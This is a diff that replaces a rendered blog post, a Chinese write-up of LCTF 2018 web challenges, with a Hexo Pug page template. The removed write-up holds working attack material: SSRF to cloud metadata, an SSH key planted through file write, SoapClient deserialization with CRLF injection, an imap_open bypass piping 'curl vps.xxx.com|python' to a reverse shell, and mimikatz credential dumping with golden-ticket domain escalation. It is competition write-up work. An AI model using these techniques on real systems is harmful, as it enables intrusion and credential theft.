@@ -1,378 +1,52 @@
-<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>LCTF 2018 部分 web 题详细 writeup | K0rz3n's Blog</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/normalize/8.0.1/normalize.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//lib.baomitu.com/jquery/3.4.0/jquery.min.js"></script><link rel="icon" mask sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">LCTF 2018 部分 web 题详细 writeup</h1><a id="logo" href="/.">K0rz3n's Blog</a><p class="description">Shell-is-Only-the-Beginning</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> Home</i></a><a href="/archives/"><i class="fa fa-archive"> Archive</i></a><a href="/about/"><i class="fa fa-user"> About</i></a><a href="/atom.xml"><i class="fa fa-rss"> RSS</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">LCTF 2018 部分 web 题详细 writeup</h1><div class="post-meta">Nov 21, 2018<span> | </span><span class="category"><a href="/categories/CTF/">CTF</a></span><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> Hits</span></span></div><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">Contents</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0X00-前言"><span class="toc-number">1.</span> <span class="toc-text">0X00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X01-Travel"><span class="toc-number">2.</span> <span class="toc-text">0X01 Travel</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X02-bestphp’s-revenge"><span class="toc-number">3.</span> <span class="toc-text">0X02 bestphp’s revenge</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X03-God-of-domain-pentest"><span class="toc-number">4.</span> <span class="toc-text">0X03 God of domain-pentest</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X04-T4lk-1s-ch34p-sh0w-m3-the-sh31l-sh0w-m3-the-sh31l-4ga1n"><span class="toc-number">5.</span> <span class="toc-text">0X04 T4lk 1s ch34p,sh0w m3 the sh31l/sh0w m3 the sh31l 4ga1n</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X05-年久失修的系统"><span class="toc-number">6.</span> <span class="toc-text">0X05 年久失修的系统</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X06-参考"><span class="toc-number">7.</span> <span class="toc-text">0X06 参考</span></a></li></ol></div></div><div class="post-content"><h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>LCTF 2018 还是一如既往的来了，虽然也是出题人，但是并不代表能做出来其他师傅的题，我也是一边运维一边做题，一边听师傅们的思路，简单的看了几道题，下面是简单的记录</p>
-<h2 id="0X01-Travel"><a href="#0X01-Travel" class="headerlink" title="0X01 Travel"></a><strong>0X01 Travel</strong></h2><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Travel1.png" alt="此处输入图片的描述"></p>
-<a id="more"></a>
-<p><strong>还给了代码：</strong></p>
-<pre><code># -*- coding: utf-8 -*-
+extends base
 
-from flask import request, render_template
-from config import create_app
-import os
-import urllib
-import requests
-import uuid
+block title
+  title= page.title + ' | ' + config.title
 
-app = create_app()
+block content
+  .post
+    h1.post-title= page.title
+    .post-meta= page.date.format('ll')
+      if page.categories.length > 0
+        span= ' | '
+        span.category
+          for category in page.categories.toArray()
+            a(href=url_for(category.path))= category.name
+      if theme.busuanzi == true
+        script(src='https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js', async)
+        span#busuanzi_container_page_pv= ' | '
+          span#busuanzi_value_page_pv
+          span= ' ' + __('Hits')
+    if theme.duoshuo
+      a.ds-thread-count(data-thread-key=page.path, href=url_for(page.path) + '#comments')
+    if theme.disqus
+      a.disqus-comment-count(data-disqus-identifier=page.path, href=url_for(page.path) + '#disqus_thread')
+    if theme.gentie
+      a.ds-thread-count(class='cloud-tie-join-count', href=url_for(page.path) + '#comments')
+        span.join-count(style='font-size: 15px; color: #6E7173;') 0
+        span= ' ' + __('Discuss')
 
-@app.route(&apos;/upload/&lt;filename&gt;&apos;, methods = [&apos;PUT&apos;])            # 幂等的请求，会产生覆盖
-def upload_file(filename):
-    name = request.cookies.get(&apos;name&apos;)
-    pwd = request.cookies.get(&apos;pwd&apos;)
-    if name != &apos;lctf&apos; or pwd != str(uuid.getnode()):           # 不知道硬件地址则绕不过去
-        return &quot;0&quot;
-    filename = urllib.unquote(filename)                         # 进行 url 解码
-    with open(os.path.join(app.config[&apos;UPLOAD_FOLDER&apos;], filename), &apos;w&apos;) as f:
-        f.write(request.get_data(as_text = True))
-        return &quot;1&quot;
-    return &quot;0&quot;
-
-@app.route(&apos;/&apos;, methods = [&apos;GET&apos;])
-def index():
-    url = request.args.get(&apos;url&apos;, &apos;&apos;)
-    if url == &apos;&apos;:
-        return render_template(&apos;index.html&apos;)
-    if &quot;http&quot; != url[: 4]:                                     # 必须要 http 请求
-        return &quot;hacker&quot;
-    try:
-        response = requests.get(url, timeout = 10)
-        response.encoding = &apos;utf-8&apos;
-        return response.text
-    except:
-        return &quot;Something Error&quot;
-
-@app.route(&apos;/source&apos;, methods = [&apos;GET&apos;])
-def get_source():
-    return open(__file__).read()
-
-if __name__ == &apos;__main__&apos;:
-    app.run()
-</code></pre><p>了解过 SSRF 的同学看一眼就知道是 SSRF ，但是我们的目标是什么呢？我们看到有一个文件写的点，但是我们并不知道 uuid.getnode() ，在HCTF 我们已经领略过这个函数的作用，我们知道他是主机的 mac 地址的十进制表示，于是我们希望利用SSRF 实现本地文件读取，但是这里明显有几个限制，首先限制了 协议是 http 和 https ，这就排除了我们使用 file 等协议，当然可能有人说可以使用 302 跳转，没错，requests.get() 在没有设置，allow_redirects=False 的情况下是会进行跟随的，但是如果你尝试使用 file 等其他协议他就会报错，这应该是 requests 的保护机制吧。</p>
-<p>那么这种情况下其实还是要看看开放的端口，毕竟是 flask ，万一有什么 redis 啥的未授权呢？可以直接写 shell 啥的，我使用 nmap 测试了一下发现只有80 和 22 ，没戏了，想别的办法吧。</p>
-<p>后来给了提示说是什么 “留意云服务商和差异性”，云服务商是啥，我们看一下</p>
-<pre><code>$ curl cip.cc/118.25.150.86
-IP      : 118.25.150.86
-地址    : 中国  上海
-运营商  : tencent.com
-
-数据二  : 上海市 | 腾讯云
-
-数据三  : 中国上海上海市 | 电信
-
-URL     : http://www.cip.cc/118.25.150.86
-</code></pre><p>腾讯云，那我们看一下腾讯云的<a href="https://cloud.tencent.com/document/product/213/4934" target="_blank" rel="noopener">实例文档</a>，找到了下面的东西</p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Travel2.png" alt="此处输入图片的描述"></p>
-<p>不得了！我们试一下获取 mac ,直接输 <a href="http://metadata.tencentyun.com/latest/meta-data/mac" target="_blank" rel="noopener">http://metadata.tencentyun.com/latest/meta-data/mac</a></p>
-<pre><code>52:54:00:48:c8:73
-</code></pre><p>我们从而得到十进制：90520735500403</p>
-<p>这样我们就能写文件了，但是我又发现了一个问题，这个写文件要求是 PUT 请求，然后我怎么 PUT 都 405 ，后来才知道 nginx 的 405 和 flask 的 405 不是一个 405，还是那么菜。</p>
-<p>下图是 get 请求的到的 405 </p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Travel3.png" alt="此处输入图片的描述"></p>
-<p>下图是 PUT 请求得到的405 </p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Travel4.png" alt="此处输入图片的描述"></p>
-<p>我们看到使用 PUT 方法的 405 是 nginx 给我们的，也就是这个是经过反向代理得到的，我们的 PUT 请求被反向代理服务器拦截了，我们这样也就明确了目标，我们如何在 flask 中突破 nginx 反向代理的限制，同时出题人也给了一个提示 header ，这样我们就去找一下 flask 中什么请求头有这样的作用</p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Travel5.png" alt="此处输入图片的描述"></p>
-<p>我们来试一下</p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Travel6.png" alt="此处输入图片的描述"></p>
-<p>可以看到我们能返回1 ，那我们是不是就能任意文件写了呢？</p>
-<p>用户名在代码中已经存在 lctf ，那我们可以写一个公钥 /home/lctf/.ssh/authorized_keys，地址这里还有一个小坑，必须要使用 URL 二次编码 </p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Travel7.png" alt="此处输入图片的描述"></p>
-<p>这时候已经成功写入，我们登录</p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Travel8.png" alt="此处输入图片的描述"></p>
-<h2 id="0X02-bestphp’s-revenge"><a href="#0X02-bestphp’s-revenge" class="headerlink" title="0X02 bestphp’s revenge"></a><strong>0X02 bestphp’s revenge</strong></h2><p><strong>代码审计：</strong></p>
-<pre><code>&lt;?php
-highlight_file(__FILE__);
-$b = &apos;implode&apos;;
-call_user_func($_GET[f],$_POST);
-session_start();
-if(isset($_GET[&apos;name&apos;])){
-    $_SESSION[&apos;name&apos;] = $_GET[&apos;name&apos;];
-}
-var_dump($_SESSION);
-$a = array(reset($_SESSION),&apos;welcome_to_the_lctf2018&apos;);
-call_user_func($b,$a);
-?&gt;
-array(0) { } 
-</code></pre><p>还有一个 flag.php </p>
-<pre><code>&lt;?php
-
-session_start();
-echo &apos;only localhost can get flag!&apos;;
-$flag = &apos;LCTF{*************************}&apos;;
-if($_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;){
-       $_SESSION[&apos;flag&apos;] = $flag;
-   }
-//only localhost can get flag!
-</code></pre><p>一开始看 index.php ,可以说是一脸蒙蔽了，但是后来看了 flag.php 以后目标就很清晰了，我们需要伪造我们的 remote_addr 为 Localhost 然后访问 flag.php 拿到 flag ，但我们知道 remote_addr 哪里能伪造，想要让 remote_addr 是 127.0.0.1 那只有一种方法就是实现 ssrf ，后来给了一个 hint ：反序列化，也就是我们要使用反序列化触发 ssrf 访问 flag.php 页面，并且访问的时候我们还要带上我们自己的 cookie 访问，要不然我们没法写到我们自己的 session 中，这样我们也就没法访问到 flag 了</p>
-<p>但是问题来了，我之前在分析 php 反序列化的时候也说了，PHP 反序列化就是要控制一个类的属性，然后在调用过程中最终传入某个恶意函数中达到命令执行或者代码执行的效果，但是很明显这里啥都没有，这其实也给了我们一个提示，我们要用 php 的原生类，其实这个知识点在 N1CTF 2018 中已经出现过了，使用 soapclient 原生类，在不使用 wsdl 的情况下创建的对象在调用不存在的方法的时候会触发 __call 方法，然后能发起请求</p>
-<p>我们看一下我的测试</p>
-<p><strong>test.php</strong></p>
-<pre><code>&lt;?php
-$a = new SoapClient(null, array(
-            &apos;location&apos;=&gt; &quot;http://h4ck3r.club:9999&quot;, 
-            &apos;uri&apos;=&gt; &quot;test&quot;
-)); 
-
-$a-&gt;getsubtime();
-</code></pre><p><strong>结果如图：</strong></p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_best1.png" alt="此处输入图片的描述"></p>
-<p>成功的发起了请求，这其实就是我们实现 SSRF，然后如何携带 Cookie 呢？ 这里用到了 soapclient 的一个 uri 和 user_agent的 CRLF 注入，我们</p>
-<p><strong>test.php</strong></p>
-<pre><code>&lt;?php
-$a = new SoapClient(null, array(
-            &apos;location&apos;=&gt; &quot;http://h4ck3r.club:9999&quot;, 
-            &apos;user_agent&apos; =&gt; &quot;AAA:BBB\r\n&quot;.&quot;Cookie:PHPSESSID=dde63k4h9t7c9dfl79np27e912&quot;,
-            &apos;uri&apos;=&gt; &quot;test&quot;
-)); 
-$res = serialize($a);
-$a = unserialize($res);
-$a-&gt;getsubtime();
-</code></pre><p><strong>结果：</strong></p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_best5.png" alt="此处输入图片的描述"></p>
-<p>当然怎么反序列化这其实还是一个问题,但是观察代码，我们很明显能看到一个存在序列化的地方</p>
-<pre><code>&lt;?php
-//...
-session_start();
-if(isset($_GET[&apos;name&apos;])){
-  $_SESSION[&apos;name&apos;] = $_GET[&apos;name&apos;];
-}
-//...
-</code></pre><p>我们知道，session 是经过序列化进行存储的，我们可以试试，传入 name=K0rz3n 上面代码执行的结果是</p>
-<pre><code>name|s:6:&quot;K0rz3n&quot;;
-</code></pre><p>等等，这个序列化为什么长得有些奇怪，感觉和我们对象使用 serialize 序列化出来的结果长得很不一样，没错，这个其实就是我们的利用点了，php 在 sesion 序列化的时候有三种序列化引擎，php 、php_serialize 和 php_binary,其中 php 这种序列化的方式是默认的方式。</p>
-<blockquote>
-<p>php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值<br>php:存储方式是，键名+竖线+经过serialize()函数序列处理的值<br>php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值</p>
-</blockquote>
-<p>也就是说， php 这种序列化的方式是不序列化键名的，而是单纯地序列化键值，而对键值的序列化使用的是我们在序列化对象的时候使用的 serialize() 函数的方式，那我们有这样的一种想法，如果我们把我们的 soapclient 对象序列化后在前面，加一个 | 然后存入 session ，并且指定 session 序列化的方法为 php_serialize</p>
-<pre><code>a:1:{s:4:&quot;name&quot;;s:115:&quot;|O:10:&quot;SoapClient&quot;:3:{s:3:&quot;uri&quot;;s:4:&quot;test&quot;;s:8:&quot;location&quot;;s:23:&quot;http://h4ck3r.club:9999&quot;;s:13:&quot;_soap_version&quot;;i:1;}&quot;;}
-</code></pre><p>这一步的实现可以通过题目中的 </p>
-<pre><code>call_user_func($_GET[f],$_POST);
-</code></pre><p>来实现，当然这个要借助 session_start() 函数的一个选项</p>
-<pre><code>bool session_start ([ array $options = array() ] )
-
-options
-此参数是一个关联数组，如果提供，那么会用其中的项目覆盖 会话配置指示 中的配置项。此数组中的键无需包含 session. 前缀。
-</code></pre><p>那么会话配置指示里面是什么呢？</p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_best2.png" alt="此处输入图片的描述"></p>
-<p>那么在 session 反序列化的时候使用默认的 php 引擎的话就会错误地将这个 | 当做控制字符来分隔键值和键名（这其实就是注入漏洞的本质），然后对我们 | 后面的部分再次使用 unserialize() 反序列化，那我们的对象就能重现江湖了</p>
-<p>等等，为什么能触发反序列化呢？？？？</p>
-<p><strong>如图所示：</strong></p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_best3.png" alt="此处输入图片的描述"></p>
-<p>也就是说这个步骤是 php 在处理会话的过程中帮我们自动完成的,不信我们测试一下，目前的状态是我们已经将我们的 soapclient 对象按照 php_serialize 的方式序列化进了 session 文件，然后我们要按照 php 引擎的方式解析，下面是测试代码</p>
-<p><strong>test.php</strong></p>
-<pre><code>&lt;?php
-
-session_start();
-$a = array(reset($_SESSION),&apos;welcome_to_the_lctf2018&apos;);
-var_dump($a);
-</code></pre><p><strong>结果：</strong></p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_best4.png" alt="此处输入图片的描述"></p>
-<p>很明显我们的注入成功了，他按照我们注入的 | 进行了分隔，反序列化了我们传入的 soapclient</p>
-<p>好，现在反序列化和 SSRF 我们已经捋清楚了，我们还差一点东西，根据 soapclient 的要求，我么想要发起请求必须要让反序列化出来的对象调用一个不存在的方法，怎么弄？</p>
-<p>于是我又注意到了这个代码下面还有一个 call_user_func() 这不得不说是一个非常明显的疑点，按道理这里就应该是我们的利用点了，因为我们的  <code>$a[0]</code> 就是我们的 soapcliet 对象了，虽然 <code>$b</code> 是一个确定的值，但是我们还是能使用 第一个 call_user_func 调用  extract 来实现变量覆盖</p>
-<p>我们看一下下面的操作吧</p>
-<p><strong>test1.php</strong></p>
-<pre><code>&lt;?php
-
-class test{
-
-    function __call($name,$args){
-        echo &quot;Hello~&quot;;
-    }
-
-}
-
-$a = new test();
-call_user_func(array($a,&apos;hhh&apos;));
-
-?&gt;
-</code></pre><p><strong>结果：</strong></p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_best6.png" alt="此处输入图片的描述"></p>
-<p>我们在 call_user_func 中传入了一个 array() 并且第一个值为一个类的对象，另一个是这个类中不存在的方法，然后他出发了调用，好了，这里的思路我们彻底清晰了</p>
-<p>我们要使用 extract 覆盖变量 b 为 call_user_func 然后，”welcome_to_the_lctf2018” 这个字符串就是我们的不存在的方法。最终可以实现 __call 的调用，实现发出带着我们设定好 cookie 的请求，然后 flag 被写入我们的 session 中，我们最后再带着这个 cookie 列出 session 中的内容就可以了</p>
-<h2 id="0X03-God-of-domain-pentest"><a href="#0X03-God-of-domain-pentest" class="headerlink" title="0X03 God of domain-pentest"></a><strong>0X03 God of domain-pentest</strong></h2><pre><code>&lt;?php
-highlight_file(__FILE__);
-$lshell=$_GET[&apos;lshell&apos;];
-eval($lshell);
-var_dump($lshell);
-NULL 
-</code></pre><p>先使用 phpinfo(); 看一下 disable function ，因为出题人在旁边，他说过滤了全部，不要我继续绕 disable 了，</p>
-<p><strong>如图：</strong></p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest1.png" alt="此处输入图片的描述"></p>
-<p>最近不是出了一个新的操作？用来 bypass disable_fuction 的 imap </p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest2.png" alt="此处输入图片的描述"></p>
-<p>不多说，打！一开始使用 bash 反弹没成功，问了一下他们，他们说 Python 反弹效果更好欧，于是开始 python 反弹，结果还是不行，后来把 Payload 放在了服务器上，然后用 curl 请求 并且使用 | 交给 python 执行（向师傅们学来的操作），</p>
-<pre><code>curl vps.xxx.com|python
-</code></pre><p>然后，我们将其 base64 以后放在 payload 框架里</p>
-<pre><code>$server = &quot;x -oProxyCommand=echo\txxxxxxxxxxxxxxxxxxxxxx|base64\t-d|sh}&quot;;imap_open(&apos;{&apos;.$server.&apos;:143/imap}INBOX&apos;, &apos;&apos;, &apos;&apos;) or die(&quot;\n\nError: &quot;.imap_last_error());
-</code></pre><p>然后为了防止 url 传输过去的问题，还是使用 url 编码</p>
-<pre><code>%24server%20%3D%20%22x%20-oProxyCommand%3Decho%5Ctxxxxxxxxxxxxxxxxxxxxxx%7Cbase64%5Ct-d%7Csh%7D%22%3Bimap_open(&apos;%7B&apos;.%24server.&apos;%3A143%2Fimap%7DINBOX&apos;%2C%20&apos;&apos;%2C%20&apos;&apos;)%20or%20die(%22%5Cn%5CnError%3A%20%22.imap_last_error())%3B
-</code></pre><p>然后执行就行了，成功反弹</p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest3.png" alt="此处输入图片的描述"></p>
-<p>看一下 ip </p>
-<pre><code>eth0      Link encap:Ethernet  HWaddr 52:54:00:2a:75:a6  
-          inet addr:172.21.0.17  Bcast:172.21.15.255  Mask:255.255.240.0
-          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
-          RX packets:897233 errors:0 dropped:0 overruns:0 frame:0
-          TX packets:783700 errors:0 dropped:0 overruns:0 carrier:0
-          collisions:0 txqueuelen:1000 
-          RX bytes:264883816 (264.8 MB)  TX bytes:240894961 (240.8 MB)
-
-lo        Link encap:Local Loopback  
-          inet addr:127.0.0.1  Mask:255.0.0.0
-          UP LOOPBACK RUNNING  MTU:65536  Metric:1
-          RX packets:1824 errors:0 dropped:0 overruns:0 frame:0
-          TX packets:1824 errors:0 dropped:0 overruns:0 carrier:0
-          collisions:0 txqueuelen:1 
-          RX bytes:177022 (177.0 KB)  TX bytes:177022 (177.0 KB)
-</code></pre><p>内网 ip 已经明确了，然后在 /var/www 目录下面看到了出题人好心的 ew</p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest4.png" alt="此处输入图片的描述"></p>
-<p>我们试一下挂一个内网的代理，我有时候选择全局有时候指定应用，这个其实根据你使用的工具来决定</p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest5.png" alt="此处输入图片的描述"></p>
-<p>然后我直接使用 netstat -ano 看了一下这台服务器建立的链接发现，他和 172.21.0.8 成功建立连接，这就直接找到了一台服务器</p>
-<p><strong>如图所示：</strong></p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest7.png" alt="此处输入图片的描述"></p>
-<p>浏览器成功访问</p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest6.png" alt="此处输入图片的描述"></p>
-<p>进行一波目录扫描</p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest8.png" alt="此处输入图片的描述"></p>
-<p>PHPmyadmin 提权？ 我们进去看看</p>
-<p>root root 登录，这还得了，观察一下我们也能发现这个就是一个简单的 phpstudy 起的，我们 MySQL 提权那么多方法，不了解的可以看我的<a href="http://www.k0rz3n.com/2018/10/21/Mysql%20%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/">这篇文章</a></p>
-<p>我首先尝试了使用 select into outfile 的方法，但是收到了 secure_file_priv 的限制，后来我选择了使用 general_log 的方法，我们先看一下</p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest9.png" alt="此处输入图片的描述"></p>
-<p>这样不仅能看到选项是否开启，也能看到默认的安装路径了，那这样web 目录也就非常清晰</p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest10.png" alt="此处输入图片的描述"></p>
-<p>现在我们拿到了 webshell 然后我们需要反弹 windows 的 shell ，使用 cs </p>
-<pre><code>./teamserver xxx.xxx.xxx.xxx K0rz3n
-</code></pre><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest11.png" alt="此处输入图片的描述"></p>
-<p>用 cs 生成 powershell payload 执行</p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest12.png" alt="此处输入图片的描述"></p>
-<p>然后抓密码，先进入 cs 的命令行</p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest13.png" alt="此处输入图片的描述"></p>
-<p>输入 help 查看常见的帮助，我们注意一下那个 shell 命令，表示我们在后面执行 cmd.exe  的命令</p>
-<pre><code>shell whoami 
-</code></pre><p>就能看到我是 administrator 权限，然后我们开始抓密码，使用</p>
-<pre><code>logonpasswords
-</code></pre><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest14.png" alt="此处输入图片的描述"></p>
-<p>然后既然题目提示中提到了域环境，那我们就要先简单的判断一下，我们自己所处的环境</p>
-<pre><code>shell ipconfig/all
-</code></pre><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest15.png" alt="此处输入图片的描述"></p>
-<p>根据我之间的一域渗透的简单文章，很容易知道 DNS 就是域控</p>
-<p>我们现在需要攻击域控，使用 ms14068 拿域控的权限，使用 impacket 库中的 goldenPac.py，我们直接使用 Python 在入口机器上执行，在入口机器上的 /tmp 目录下使用 wget 下载</p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest16.png" alt="此处输入图片的描述"></p>
-<p>我们运行脚本 getshell</p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest17_.png" alt="此处输入图片的描述"></p>
-<p>好了现在拿到了子域的域控权限，是一个 windows  的 shell , 我们找一下父域域控，如图所示</p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest18.png" alt="此处输入图片的描述"></p>
-<p>先把这台机器弹回 cs 中</p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest19.png" alt="此处输入图片的描述"></p>
-<p>到 windows 上执行</p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest20.png" alt="此处输入图片的描述"></p>
-<p>我们弹回子域域控</p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest21.png" alt="此处输入图片的描述"></p>
-<p>然后就是一套注入 sidhistory 的操作</p>
-<p>(1)首先,我们需要得到域用户的安全认证标识符</p>
-<pre><code>shell wmic useraccount get Caption,sid
-</code></pre><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest22.png" alt="此处输入图片的描述"></p>
-<p>我们重点关注的是 </p>
-<pre><code>WEB\krbtgt          S-1-5-21-508737280-3758319117-1445457868-50
-</code></pre><p>他和 krb 有关系，相当于是域的一个令牌的中心，我们需要重点关注</p>
-<p>(2)我们通过 mimikatz 得到当前域的 NTML 认证令牌</p>
-<pre><code>mimikatz lsadump::lsa /patch
-</code></pre><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest23.png" alt="此处输入图片的描述"></p>
-<p>(3)我们向当前域注入我们的 sid history ,这个 history 有一个继承性，拥有了这个 history 的机子就有了原始机器的属性</p>
-<pre><code>mimikatz kerberos::golden /admin:administrator /domain:web.lctf.com /sid:S-1-5-21-508737280-3758319117-1445457868 /sids:S-1-5-21-35370905-2178818314-1839806818-519 /krbtgt:42cb5299c2e40ad7d04cb2d7d16f3a46 /startoffset:0
-</code></pre><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest24.png" alt="此处输入图片的描述"></p>
-<p>(4)访问父域域控的桌面找到 flag</p>
-<pre><code>shell type \\dc\c$\Users\\Administrator\\Desktop\\flag.txt
-</code></pre><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest25.png" alt="此处输入图片的描述"></p>
-<h2 id="0X04-T4lk-1s-ch34p-sh0w-m3-the-sh31l-sh0w-m3-the-sh31l-4ga1n"><a href="#0X04-T4lk-1s-ch34p-sh0w-m3-the-sh31l-sh0w-m3-the-sh31l-4ga1n" class="headerlink" title="0X04 T4lk 1s ch34p,sh0w m3 the sh31l/sh0w m3 the sh31l 4ga1n"></a><strong>0X04 T4lk 1s ch34p,sh0w m3 the sh31l/sh0w m3 the sh31l 4ga1n</strong></h2><p>这道题是我出的题，还有另一道是这道题的衍生，但是由于出题过程中的非预期，导致这道题没有触及到我想要考察的点，但是我本身的 wp 还是按照我的预期解写的，有兴趣的可以转到<a href="http://www.k0rz3n.com/2018/11/19/LCTF%202018%20T4lk%201s%20ch34p,sh0w%20m3%20the%20sh31l%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/">这篇文章</a></p>
-<h2 id="0X05-年久失修的系统"><a href="#0X05-年久失修的系统" class="headerlink" title="0X05 年久失修的系统"></a><strong>0X05 年久失修的系统</strong></h2><p>这道题我在比赛过程中也没来得及看，就大概知道是一个注入，但是最后是0解，真的神了，一般来讲注入0解的情况在比赛中并不常见，也正因为这个原因我赛后非常好奇的看了 klaus 师傅的 wp ，确实让我比较惊讶，这里考察的是一个神奇的点—–用户自定义变量</p>
-<p>可能有的同学不知道什么是用户自定义变量，但是你一定见过 @@datadir  、@@version、@@tmpdir 、@@basedir 等，这些我们在之前的注入中绝对用过，利用这种内置的变量我们能获取一些敏感信息，那么用户变量又是什么呢？</p>
-<p>和系统变量不同的是，用户变量的定义方式是使用一个 @ ,他的定义格式是这个样子的</p>
-<pre><code>SET @var_name = expr [, @var_name = expr] ...
-</code></pre><p><strong>我们实验一下：</strong></p>
-<pre><code>mysql&gt; set @a = 1;
-Query OK, 0 rows affected (0.00 sec)
-
-mysql&gt; select @a;
-+------+
-| @a   |
-+------+
-|    1 |
-+------+
-1 row in set (0.00 sec)
-</code></pre><blockquote>
-<p><strong>注意：</strong></p>
-<p>(1)可以先在用户变量中保存值然后在以后引用它；这样可以将值从一个语句传递到另一个语句。用户变量与连接有关。也就是说，一个客户端定义的变量不能被其它客户端看到或使用。当客户端退出时，该客户端连接的所有变量将自动释放。<br>(2)对于 SET，可以使用=或:=作为分配符。分配给每个变量的expr可以为整数、实数、字符串或者NULL值。<br>(3)也可以用 select 语句代替SET来为用户变量分配一个值。在这种情况下，分配符必须为:=而不能用=，因为在非SET语句中=被视为一个比较 操作符：</p>
-</blockquote>
-<p>我们来尝试一下使用 select 语句给自定义变量赋值</p>
-<pre><code>mysql&gt; select @a:=2;
